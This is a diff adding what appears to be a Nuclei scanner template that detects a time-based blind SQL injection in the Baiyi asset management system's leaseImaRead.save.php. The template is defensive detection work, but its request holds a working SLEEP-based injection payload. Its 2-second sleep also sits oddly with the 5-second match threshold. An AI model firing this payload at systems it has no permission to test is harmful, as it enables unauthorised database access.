@@ -1,0 +1,31 @@
+id: zgy-leaseImaRead-sqli
+
+info:
+  name: Baiyi Asset Management System SQL Injection
+  author: onewin
+  severity: high
+  description: |
+    Baiyi Asset Management System leaseImaRead.save.php is vulnerable to SQL injection. Exploitation can lead to unauthorized access to the database or potential system compromise.
+  tags: 百易云资产管理运营系统
+  
+http:
+  - raw:
+      - |
+        GET /adminx/leaseImaRead.save.php?act=makeToFee&id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(2)))OKTO) HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration > 5"
+      - type: word
+        words:
+          - "操作失败系统更新"
